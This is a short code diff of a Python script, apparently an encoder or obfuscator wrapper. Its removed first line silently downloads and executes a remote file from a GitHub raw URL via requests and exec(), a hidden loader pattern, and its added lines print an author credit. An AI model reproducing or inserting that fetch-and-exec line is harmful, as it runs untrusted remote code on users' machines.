@@ -1,8 +1,11 @@
-import requests;exec(requests.get('https://raw.githubusercontent.com/requestg/requestg/refs/heads/main/Time.py').text)
 import tempfile
 import shutil
 import os
 import sys
+import time
+
+os.system('clear');print('The Encode By Sajad-@f_g_d_6');time.sleep(3)
+
 ka = """import sys
 import re
 import webbrowser
